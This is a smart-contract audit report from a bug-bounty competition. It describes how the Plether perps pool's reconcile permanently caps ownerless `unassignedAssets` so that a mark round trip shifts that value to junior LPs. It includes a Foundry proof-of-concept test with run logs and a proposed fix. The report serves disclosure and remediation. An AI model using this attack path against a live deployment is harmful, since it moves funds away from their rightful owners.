# \#99438 [SC-Medium] Reconcile permanently caps `unassignedAssets` at a transient mark-to-market value, so a mark round trip moves ownerless pool value into junior LP principal

**Submitted on Nov 13th 2026 at 16:47:49 UTC by @Web3Vinay for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99438
- **Report Type:** Smart Contract
- **Report severity:** Medium
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield
  - Contract fails to deliver promised returns, but doesn't lose value

## Description

### Brief/Intro

`unassignedAssets` holds pool value that belongs to no LP, usually the part of an owner recapitalization above the senior high-water-mark gap. Governance later assigns it with `assignUnassignedAssets`. During reconcile, this balance is capped at the current mark-to-market `distributable`, and the capped value is **written to storage**. If an open trader's unrealized gain wipes LP principal at the current mark, the reconcile cuts `unassignedAssets` permanently. When the mark returns, the recovered value is paid as revenue to senior (up to its HWM) and then to **junior LPs**. Total pool assets never change; only ownership moves. Anyone can trigger the reconcile at the adverse tick.

This is separate from the recap-routing finding (`HousePoolPendingPreviewLib.sol:117-122`). The code, the fix and the victim are all different, and fixing either one does not fix the other.

### Vulnerability Details

```solidity
// packages/perps/src/libraries/HousePoolReconcilePlanLib.sol:73-74
@> plan.state.unassignedAssets =
       state.unassignedAssets > snapshot.distributable ? snapshot.distributable : state.unassignedAssets;
```

```solidity
// packages/perps/src/HousePool.sol:1585
@> unassignedAssets = plan.state.unassignedAssets;   // transient cap persisted
```

- `snapshot.distributable` is mark-to-market equity net of pending buckets (`HousePoolReconcilePlanLib.sol:68-70`), so it falls whenever a trader's unrealized gain rises.
- The write-down is not recorded anywhere, and no code path restores it. The senior tranche has a `seniorHighWaterMark` for this case (`ACCOUNTING_SPEC.md:337`); `unassignedAssets` has nothing similar.
- When the mark recovers, the whole recovery `distributable - unassignedAssets(capped)` goes to claimants (`HousePoolReconcilePlanLib.sol:76-104`). `applyRevenueIntent` first restores senior to its HWM and then gives the rest to `juniorPrincipal`, because junior seed supply is always nonzero (`HousePoolPendingPreviewLib.sol:180-183`).

**What the protocol promises:**
- `INTERNAL_ARCHITECTURE_MAP.md:75`: unassigned assets "Require explicit assignment; cannot silently become windfall LP ownership."
- `ACCOUNTING_SPEC.md:356-357`: revenue with no eligible owner goes to `unassignedAssets`, and "a new depositor cannot acquire it".
- `HousePool.sol:657` (natspec of `assignUnassignedAssets`): "Prevents later LPs from implicitly capturing previously ownerless value."

**Attack path:**
1. After a heavy LP loss, the owner recapitalizes with more than the senior HWM gap. The excess becomes `unassignedAssets = U` (`HousePoolPendingPreviewLib.sol:134-135`). It stays there until the owner calls `assignUnassignedAssets`.
2. The mark moves so that an open trader's unrealized gain `G` is larger than LP principal `S + J`.
3. Anyone calls `OrderRouter.settleLpEpoch` (`OrderRouter.sol:479`) at that tick. Reconcile writes `S = J = 0` and `unassignedAssets = U - (G - S - J)`.
4. The mark returns. Senior is restored to its HWM, and junior is credited with `G - S - J`, exactly the amount that unassigned lost.

### Impact Details

Broken invariant: **ownerless value can only leave `unassignedAssets` through an explicit governance assignment.**

Measured in the PoC. `totalAssets` is unchanged at every step.

| PoC | Setup | Unassigned | Junior principal | Senior |
|---|---|---|---|---|
| Mark round trip | S 100k, J 0, U 100k, tick 0.20 | **100,000 → 80,000** | **0 → 20,000** | 100k → 0 → 100k (HWM) |
| Release params (maxSkewRatio 0.4) | U 500k, **2% tick (0.98)** | **500,000 → 494,000** | **~1,000 → ~7,000** | unchanged |

- The value moved is `G - (S + J)`, capped at `U`, and it goes 1:1 to existing junior holders.
- The loser is whoever governance would have assigned the assets to: the recapitalizer's surplus, or senior LPs.
- New junior deposits are blocked while `unassignedAssets > 0` (`HousePoolTrancheGateLib.sol:28`), so only existing junior holders gain.

Limits: the issue needs leftover unassigned assets while trading is live (a prior heavy loss plus an owner over-recap), and LP principal fully wiped at the current mark. The owner can close the window by calling `assignUnassignedAssets` right after the recap. `ACCOUNTING_SPEC.md:652` calls unassigned "exceptional telemetry". The caller does not profit unless they hold junior shares.

### Mitigation

Do not persist the cap. Use `effectiveUnassigned = min(unassignedAssets, distributable)` only to compute `distributableToClaims` for that reconcile, and leave the stored `unassignedAssets` unchanged. Alternatively, track an HWM-style `unassignedImpairment` that a recovery restores before any claimant revenue. Check LP-withdrawal liveness after the change, because `_buildWithdrawalSnapshot` adds unassigned to reserves.

### References

- `packages/perps/src/libraries/HousePoolReconcilePlanLib.sol:73-74`: transient cap of `unassignedAssets`
- `packages/perps/src/libraries/HousePoolReconcilePlanLib.sol:68-70`, `:76-104`: mark-dependent `distributable`, recovery paid to claimants
- `packages/perps/src/HousePool.sol:1585`: capped value written to storage
- `packages/perps/src/libraries/HousePoolPendingPreviewLib.sol:134-135`: recap overflow goes to unassigned
- `packages/perps/src/libraries/HousePoolPendingPreviewLib.sol:180-183`: revenue remainder goes to junior
- `packages/perps/src/HousePool.sol:657-660`: `assignUnassignedAssets`
- `packages/perps/src/OrderRouter.sol:479`: permissionless `settleLpEpoch`
- `packages/perps/src/libraries/HousePoolTrancheGateLib.sol:28`: junior deposits blocked while unassigned > 0
- `packages/perps/INTERNAL_ARCHITECTURE_MAP.md:75`, `packages/perps/ACCOUNTING_SPEC.md:356-357`: unassigned assets need explicit assignment

## Proof of Concept

## Proof of Concept

Save as `packages/perps/test/perps/poc/UnassignedCapRoundTrip.t.sol`. It uses the repo's `BasePerpTest` fixture. Run:

```
forge test --root packages/perps --match-path test/perps/poc/UnassignedCapRoundTrip.t.sol -vv
```

A realized LP loss is modeled by burning pool USDG. The adverse tick is applied for a single reconcile, and then the mark returns to entry.

- `UnassignedCapRoundTripTest`: S 100k, J 0, U 100k, mark 1.00 → 0.20 → 1.00.
- `UnassignedCapRoundTripReleaseTest`: release risk params, U 500k, a 2% tick.

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {console2} from "forge-std/console2.sol";

abstract contract UnassignedBase is BasePerpTest {
    function _mark(uint256 price) internal {
        vm.warp(vm.getBlockTimestamp() + 1);
        vm.prank(address(router));
        engine.updateMarkPrice(price, uint64(vm.getBlockTimestamp()));
    }

    function _rec() internal {
        vm.prank(address(juniorVault));
        pool.reconcile();
    }

    function _recap(uint256 amount) internal {
        settlementToken.mint(address(this), amount);
        settlementToken.approve(address(engine), amount);
        engine.recapitalizePool(amount); // owner call
    }

    function _log(string memory tag) internal view {
        console2.log(tag);
        console2.log("  senior   ", pool.seniorPrincipal());
        console2.log("  junior   ", pool.juniorPrincipal());
        console2.log("  unassign ", pool.unassignedAssets());
        console2.log("  assets   ", pool.totalAssets());
    }
}

/// 1) Mark round trip: S = 100k, J = 0, unassigned = 100k from an owner over-recap.
contract UnassignedCapRoundTripTest is UnassignedBase {
    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function _initialJuniorSeedDeposit() internal pure override returns (uint256) {
        return 100_000e6;
    }

    function _initialSeniorSeedDeposit() internal pure override returns (uint256) {
        return 100_000e6;
    }

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0,
            maxSkewRatio: 1e18,
            maintMarginBps: 100,
            initMarginBps: 150,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function test_MarkRoundTrip_MovesUnassignedToJunior() public {
        // Heavy realized loss (J = 0, S = 20k), then owner recap 180k vs an 80k gap -> 100k unassigned.
        settlementToken.burn(address(pool), 180_000e6);
        _rec();
        _recap(180_000e6);
        _rec();
        assertEq(pool.seniorPrincipal(), 100_000e6);
        assertEq(pool.unassignedAssets(), 100_000e6);

        address trader = address(0xBEEF);
        _fundTrader(trader, 50_000e6);
        _open(trader, CfdTypes.Side.LONG, 150_000e18, 20_000e6, 1e8);
        _rec();
        _log("after open at 1.00");
        uint256 unBefore = pool.unassignedAssets();
        uint256 jBefore = pool.juniorPrincipal();
        uint256 aBefore = pool.totalAssets();

        _mark(0.2e8); // trader gain ~120k > LP principal 100k
        _rec();
        _log("at adverse tick 0.20");

        _mark(1e8);
        _rec();
        _log("after mark returns to 1.00");

        console2.log("unassigned lost  ", unBefore - pool.unassignedAssets());
        console2.log("junior gained    ", pool.juniorPrincipal() - jBefore);
        assertEq(pool.totalAssets(), aBefore, "same pool assets");
        assertLt(pool.unassignedAssets(), unBefore, "unassigned permanently reduced");
        assertEq(pool.juniorPrincipal() - jBefore, unBefore - pool.unassignedAssets(), "1:1 move to junior");
    }
}

/// 2) Release risk params (maxSkewRatio 0.4e18). Default fixture: 1M junior LP + seeds.
contract UnassignedCapRoundTripReleaseTest is UnassignedBase {
    function test_ReleaseParams_MarkRoundTrip_MovesUnassignedToJunior() public {
        address trader = address(0xBEEF);
        _fundTrader(trader, 100_000e6);
        _open(trader, CfdTypes.Side.LONG, 400_000e18, 20_000e6, 1e8);
        _rec();

        // Heavy realized LP loss, then an owner recap larger than the senior gap.
        settlementToken.burn(address(pool), pool.totalAssets() - 2000e6);
        _recap(500_000e6);
        _rec();
        _log("after loss + recap");

        uint256 unBefore = pool.unassignedAssets();
        uint256 jBefore = pool.juniorPrincipal();
        uint256 sBefore = pool.seniorPrincipal();
        assertGt(unBefore, 0);

        _mark(0.98e8); // 2% adverse tick for one reconcile
        _rec();
        _log("at adverse tick 0.98");
        _mark(1e8);
        _rec();
        _log("after mark returns to 1.00");

        console2.log("unassigned lost  ", unBefore - pool.unassignedAssets());
        console2.log("junior gained    ", pool.juniorPrincipal() - jBefore);
        assertApproxEqAbs(pool.seniorPrincipal(), sBefore, 10); // coupon dust
        assertLt(pool.unassignedAssets(), unBefore, "unassigned permanently reduced");
        assertApproxEqAbs(pool.juniorPrincipal() - jBefore, unBefore - pool.unassignedAssets(), 10, "1:1 move to junior");
    }
}
```

Result (actually run):

```
Ran 1 test for test/perps/poc/UnassignedCapRoundTrip.t.sol:UnassignedCapRoundTripTest
[PASS] test_MarkRoundTrip_MovesUnassignedToJunior() (gas: 1732934)
Logs:
  after open at 1.00
    senior    100000000000
    junior    0
    unassign  100000000000
    assets    200000000000
  at adverse tick 0.20
    senior    0
    junior    0
    unassign  80000000000
    assets    200000000000
  after mark returns to 1.00
    senior    100000000000
    junior    20000000000
    unassign  80000000000
    assets    200000000000
  unassigned lost   20000000000
  junior gained     20000000000

Ran 1 test for test/perps/poc/UnassignedCapRoundTrip.t.sol:UnassignedCapRoundTripReleaseTest
[PASS] test_ReleaseParams_MarkRoundTrip_MovesUnassignedToJunior() (gas: 1737259)
Logs:
  after loss + recap
    senior    1000009132
    junior    999990868
    unassign  500000000000
    assets    502000000000
  at adverse tick 0.98
    senior    0
    junior    0
    unassign  494000000000
    assets    502000000000
  after mark returns to 1.00
    senior    1000009134
    junior    6999990866
    unassign  494000000000
    assets    502000000000
  unassigned lost   6000000000
  junior gained     5999999998

Ran 2 test suites: 2 tests passed, 0 failed, 0 skipped (2 total tests)
```

